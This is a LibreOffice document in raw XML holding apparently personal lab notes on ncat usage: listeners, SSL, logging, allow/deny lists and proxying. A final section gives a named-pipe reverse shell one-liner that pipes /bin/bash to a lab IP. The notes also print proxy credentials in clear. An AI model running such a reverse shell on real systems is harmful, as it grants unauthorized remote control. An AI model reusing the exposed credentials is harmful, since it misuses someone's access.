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, Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace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e27e" officeooo:paragraph-rsid="0002e27e"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="0002e27e" officeooo:paragraph-rsid="0015a2f8"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:paragraph-rsid="0002e27e"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="00039a22" officeooo:paragraph-rsid="00039a22"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="000b6676" officeooo:paragraph-rsid="000b6676"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:paragraph-rsid="000ec82f"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="000ec82f" officeooo:paragraph-rsid="000ec82f"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="00104ac7" officeooo:paragraph-rsid="00104ac7"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="001315a3" officeooo:paragraph-rsid="001315a3"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="0015a2f8" officeooo:paragraph-rsid="0015a2f8"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="00171f54" officeooo:paragraph-rsid="00171f54"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="00180765" officeooo:paragraph-rsid="00180765"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="0019ea9c" officeooo:paragraph-rsid="0019ea9c"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="001b54d3" officeooo:paragraph-rsid="001b54d3"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:paragraph-rsid="001ba75f"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Heading_20_1">
      <style:text-properties officeooo:rsid="0002e27e" officeooo:paragraph-rsid="0002e27e"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Heading_20_1">
      <style:text-properties officeooo:rsid="000b6676" officeooo:paragraph-rsid="000b6676"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Heading_20_1">
      <style:text-properties officeooo:rsid="000cb7f1" officeooo:paragraph-rsid="000cb7f1"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Heading_20_1">
      <style:text-properties officeooo:rsid="001315a3" officeooo:paragraph-rsid="001315a3"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Heading_20_1">
      <style:text-properties officeooo:rsid="00171f54" officeooo:paragraph-rsid="00171f54"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Heading_20_1">
      <style:text-properties officeooo:rsid="001b54d3" officeooo:paragraph-rsid="001b54d3"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Heading_20_1">
      <style:text-properties officeooo:rsid="001ba75f" officeooo:paragraph-rsid="001ba75f"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph" style:parent-style-name="Heading_20_1">
      <style:text-properties officeooo:rsid="001dc782" officeooo:paragraph-rsid="001dc782"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="001dc782" officeooo:paragraph-rsid="001dc782"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L1">
      <style:text-properties officeooo:rsid="001dc782" officeooo:paragraph-rsid="001dc782"/>
    </style:style>
    <style:style style:name="P26" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L1">
      <style:text-properties officeooo:rsid="001dc782" officeooo:paragraph-rsid="00283566"/>
    </style:style>
    <style:style style:name="P27" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:paragraph-rsid="001dc782"/>
    </style:style>
    <style:style style:name="P28" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:rsid="0020f1c7" officeooo:paragraph-rsid="0020f1c7"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="0002e27e"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="00039a22"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties officeooo:rsid="0004e87c"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties officeooo:rsid="000614c6"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties style:text-line-through-style="none" style:text-line-through-type="none" officeooo:rsid="00039a22"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties officeooo:rsid="000ec82f"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" style:font-name="inherit" fo:font-size="9.75pt" fo:font-style="normal" fo:font-weight="normal" fo:background-color="transparent" loext:char-shading-value="0" loext:padding="0in" loext:border="none"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties officeooo:rsid="00104ac7"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties officeooo:rsid="00121d9f"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties officeooo:rsid="0013c840"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties officeooo:rsid="0015a2f8"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="0015a2f8" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties officeooo:rsid="001ba75f"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties officeooo:rsid="001dc782"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties officeooo:rsid="0020f1c7"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties officeooo:rsid="00216b59"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties officeooo:rsid="0022fb90"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties officeooo:rsid="0024e7f4"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties officeooo:rsid="00267e4b"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties officeooo:rsid="0028cd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-<text:span text:style-name="T2">k to keep alive when connection is terminated</text:span></text:p>
      <text:p text:style-name="P4">nc – DON’T USE, not the version with nmap</text:p>
      <text:p text:style-name="P4">ncat – USE this is bundled with nmap</text:p>
      <text:p text:style-name="P9">For below, can connect two clients, both will receive the server message but only server will receive client message, not the other client. <text:s/><text:span text:style-name="T10">There is a whole other section for that below (I believe).</text:span></text:p>
      <text:h text:style-name="P16" text:outline-level="1">For Kali</text:h>
      <text:p text:style-name="P1">Run server: </text:p>
      <text:p text:style-name="P1"><text:tab/><text:tab/><text:tab/><text:span text:style-name="T2">ncat –</text:span><text:span text:style-name="T3">k</text:span><text:span text:style-name="T2">v -l 10.0.2.15 1234</text:span></text:p>
      <text:p text:style-name="P1">Run client:</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T1"><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T5">ncat -v 10.0.2.15 1234</text:span></text:p>
      <text:h text:style-name="P16" text:outline-level="1">For Physical Host</text:h>
      <text:p text:style-name="P1">Run server:</text:p>
      <text:p text:style-name="P1"><text:tab/><text:tab/><text:span text:style-name="T4">ncat -kv -l 1234</text:span></text:p>
      <text:p text:style-name="P1">Run client:</text:p>
      <text:p text:style-name="P2"><text:tab/><text:tab/><text:span text:style-name="T4">ncat -v localhost 1234</text:span></text:p>
      <text:p text:style-name="P1"/>
      <text:h text:style-name="P17" text:outline-level="1">General Notes</text:h>
      <text:p text:style-name="P5">Can use SSL via -ssl option for TCP (default), UDP, etc.</text:p>
      <text:p text:style-name="P5">Can use -4 for IPv4 which even if a hostname resolves to an IPv6 address</text:p>
      <text:p text:style-name="P5">--broker Can be used to echo to multiple clients from one server.</text:p>
      <text:p text:style-name="P5"><text:tab/>Must be combines with -l as a client in Broker mode makes no sense.</text:p>
      <text:h text:style-name="P18" text:outline-level="1">SSL</text:h>
      <text:p text:style-name="P7">Use ~/ncat/gen-cert.sh to generate key and cert file:</text:p>
      <text:p text:style-name="P6"><text:tab/><text:span text:style-name="Source_20_Text"><text:span text:style-name="T7">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 3650 -nodes -subj "/C=XX/ST=StateName/L=CityName/O=CompanyName/OU=CompanySectionName/CN=CommonNameOrHostname"</text:span></text:span></text:p>
      <text:p text:style-name="P6"><text:tab/><text:span text:style-name="T6">Use IP address for CommonNameOrHostname</text:span></text:p>
      <text:p text:style-name="P7">For server:</text:p>
      <text:p text:style-name="P7"><text:tab/><text:span text:style-name="T8">ncat -vk =l 10.0.2.15 </text:span><text:span text:style-name="T9">80</text:span><text:span text:style-name="T8"> –ssl –ssl-cert ncat-cert.pem –ssl-key ncat-key.pem</text:span></text:p>
      <text:p text:style-name="P8">For client:</text:p>
      <text:p text:style-name="P8"><text:soft-page-break/><text:tab/>ncat -v –ssl-verify –ssl-trustfile ncat-cert.pem 10.0.2.15 80</text:p>
      <text:h text:style-name="P19" text:outline-level="1">Output to File</text:h>
      <text:p text:style-name="P9">Can send the entire session to a file <text:span text:style-name="T11">either as text or as hex dump on the server, client connection is the same as before. <text:s/></text:span><text:span text:style-name="T12">NOTE: Each time server is started with same log file, it will NOT append to current log file.</text:span></text:p>
      <text:p text:style-name="P10">For server:</text:p>
      <text:p text:style-name="P10"><text:tab/>ncat -kv –output test1.log -l 10.0.2.15 1234</text:p>
      <text:p text:style-name="P10"><text:tab/><text:tab/><text:tab/>or</text:p>
      <text:p text:style-name="P10"><text:tab/>ncat -kv –hex-dump test1.log -l 10.0.2.15 1234</text:p>
      <text:p text:style-name="P10">For client:</text:p>
      <text:p text:style-name="P9"><text:tab/><text:span text:style-name="T11">ncat -v 10.0.2.15 1234</text:span></text:p>
      <text:h text:style-name="P20" text:outline-level="1">Allow/Deny Lists</text:h>
      <text:p text:style-name="P11">Can use single IP, CIDR range, hostname/URL, or file that lists hosts to allow or deny</text:p>
      <text:p text:style-name="P13">Allow takes precedence and denies everything else.</text:p>
      <text:p text:style-name="P11"><text:tab/>ncat -l –allow &lt;ip_or_url_or CIDR&gt;</text:p>
      <text:p text:style-name="P11"><text:tab/>ncat -l –deny &lt;ip_or_url_or_CIDR&gt;</text:p>
      <text:p text:style-name="P11"><text:tab/>ncat -l –allowfile &lt;txt_file&gt;</text:p>
      <text:p text:style-name="P11"><text:tab/>ncat -l –denyfile &lt;txt_file&gt;</text:p>
      <text:p text:style-name="P12">Maximum connections (five here)</text:p>
      <text:p text:style-name="P12"><text:tab/>ncat -l –max-conns 5</text:p>
      <text:h text:style-name="P21" text:outline-level="1">Proxying</text:h>
      <text:p text:style-name="P14">Using the proxy web site I setup <text:span text:style-name="T13">DOES NOT seem to work, proxy closes the connection.</text:span></text:p>
      <text:p text:style-name="P14"><text:tab/>ncat -v --proxy 23.95.150.145:6114 --proxy-auth bptbngld:rg1ezkohyosg --proxy-type socks4 localhost 1234</text:p>
      <text:h text:style-name="P22" text:outline-level="1">Send/Receive Only</text:h>
      <text:p text:style-name="P15">--<text:span text:style-name="T13">send-only</text:span></text:p>
      <text:p text:style-name="P15">--<text:span text:style-name="T13">recv-only</text:span></text:p>
      <text:h text:style-name="P23" text:outline-level="1"><text:soft-page-break/></text:h>
      <text:h text:style-name="P23" text:outline-level="1">Reverse Shell</text:h>
      <text:p text:style-name="P28">Here the roles of server and client are swtiched.</text:p>
      <text:list xml:id="list4059816548" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P26"><text:span text:style-name="T15">On the Server: </text:span>Make a named pipe <text:span text:style-name="T15">(that connects to the client)</text:span></text:p>
          <text:list>
            <text:list-item>
              <text:list>
                <text:list-header>
                  <text:p text:style-name="P26">mkfifo tmp/rs</text:p>
                </text:list-header>
              </text:list>
            </text:list-item>
          </text:list>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P25"><text:span text:style-name="T15">On the Client: s</text:span>tart the client <text:span text:style-name="T15">(the listener). <text:s/></text:span><text:span text:style-name="T20">This must be listening before server is started</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P24"><text:tab/><text:tab/>ncat -kv -l <text:span text:style-name="T16">0.0.0.0</text:span> 1234</text:p>
      <text:list xml:id="list71956440592214" text:continue-numbering="true" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P25"><text:span text:style-name="T15">On the Server: s</text:span>tart the reverse shell</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P24"><text:tab/><text:tab/>cat /tmp/rs | /bin/bash 2&gt;&amp;1 | ncat -v <text:span text:style-name="T15">1</text:span>0.0.2.15 <text:span text:style-name="T15">1234 </text:span>&gt; /tmp/rs</text:p>
      <text:list xml:id="list71957541632457" text:continue-numbering="true" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P25"><text:span text:style-name="T15">On the </text:span><text:span text:style-name="T19">Client</text:span><text:span text:style-name="T15">: </text:span><text:span text:style-name="T18">e</text:span>xecute command in reverse shell</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P27"><text:span text:style-name="T14"><text:tab/><text:tab/>hostname, ls, whatever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, Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace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7:22:56.796907738</meta:creation-date>
    <meta:generator>LibreOffice/7.0.4.2$Linux_X86_64 LibreOffice_project/00$Build-2</meta:generator>
    <dc:date>2025-09-01T07:19:55.893309434</dc:date>
    <meta:editing-duration>P2DT17H46M29S</meta:editing-duration>
    <meta:editing-cycles>32</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="3" meta:paragraph-count="60" meta:word-count="427" meta:character-count="2590" meta:non-whitespace-character-count="2194"/>
  </office:meta>
</office:document-meta>
</file>